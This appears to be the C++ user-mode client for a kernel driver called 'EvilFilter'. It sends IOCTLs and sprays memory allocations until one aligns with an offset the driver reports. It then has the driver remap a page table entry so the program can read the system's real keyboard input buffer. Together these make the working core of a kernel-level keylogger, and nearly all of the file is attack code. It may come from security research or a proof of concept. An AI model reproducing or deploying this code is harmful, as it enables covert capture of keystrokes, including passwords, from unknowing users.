// ConsoleApplication2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <SharedHeader.h>
#include <ntsecapi.h>

#define ASCII_0_VALU 48
#define ASCII_9_VALU 57
#define ASCII_A_VALU 65
#define ASCII_F_VALU 70

unsigned long HexStringToUInt(char * hexstring)
{
	unsigned long result = 0;
	char const *c = hexstring;
	char thisC;

	while ((thisC = *c) != NULL)
	{
		unsigned int add;
		thisC = toupper(thisC);

		result <<= 4;

		if (thisC >= ASCII_0_VALU &&  thisC <= ASCII_9_VALU)
			add = thisC - ASCII_0_VALU;
		else if (thisC >= ASCII_A_VALU && thisC <= ASCII_F_VALU)
			add = thisC - ASCII_A_VALU + 10;
		else
		{
			printf("Unrecognised hex character \"%c\"\n", thisC);
			exit(-1);
		}

		result += add;
		++c;
	}

	return result;
}




VOID pauseForABit(WORD secondsDelay) {

	printf("Waiting for %d seconds...", secondsDelay);
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD ExitMinute = systemTime.wMinute;
	WORD ExitSecond = systemTime.wSecond + secondsDelay;
	while (ExitSecond > 59) {
		ExitSecond = ExitSecond - 60;
		ExitMinute = ExitMinute + 1;
	}
	while (ExitMinute > 59) {
		ExitMinute = ExitMinute - 60;
	}
	WORD CurrentMinute = systemTime.wMinute;
	WORD CurrentSecond = systemTime.wSecond;


	while (TRUE) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
		CurrentSecond = systemTime.wSecond;
		if (CurrentMinute == ExitMinute && CurrentSecond >= ExitSecond) {
			break;
		}
	}
	printf("done waiting\n");
	return;
}
VOID WaitAMinute() {
	printf("Waiting a minute...");
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD CurrentMinute = systemTime.wMinute;
	WORD ExitMinute;
	if (systemTime.wSecond > 30) {
		ExitMinute = systemTime.wMinute + 2;
	}
	else {
		ExitMinute = systemTime.wMinute + 1;
	}
	//while (FALSE) {
	while (CurrentMinute != ExitMinute) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
	}
	printf("done waiting\n");
}

int main(int argc, _TCHAR* argv[]) {
	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;
	
	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING,0,NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		OVERLAPPED      DeviceIoOverlapped;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		PCHAR sAddress = (PCHAR)malloc(sizeof(CHAR) * 20);
		while (TRUE) {
			printf("enter address:");
			gets_s(sAddress, 20);
			ULONG lAddress = HexStringToUInt(sAddress);
			dataToTransmit->instruction = 'W';
			dataToTransmit->offset = lAddress;
			DeviceIoOverlapped.Offset = 0;
			DeviceIoOverlapped.OffsetHigh = 0;
			DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
				printf("Ioctl to EvilFilter device failed\n");
			}
			else {
				printf("success!\n");
			}
		}

		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;
		DeviceIoOverlapped.Offset = 0;
		DeviceIoOverlapped.OffsetHigh = 0;
		DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);


		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset = dataToTransmit->offset;

			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			PLLIST listNode;
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			pauseForABit(10);
			printf("\nTransmitting\n");
			pauseForABit(5);
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				printf("Ioctl to EvilFilter device succeeded \n");
				printf(" we now have the real keyboard buffer!!!\n");
				dataToTransmit->instruction = 'Q';

				printf("\nDouble checking with the driver that the address is correct\n");
				pauseForABit(5);
				if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
					printf("Ioctl to EvilFilter device failed - unable to query driver\n");
				}
				else {
					printf("\nverified....examine KMDF log\n");
				}
			}
		}
		CloseHandle(hControlDevice);
		pauseForABit(10);
		printf("almost done\n");
		pauseForABit(3000);
	}
	printf("fin\n");
	return 0;
}
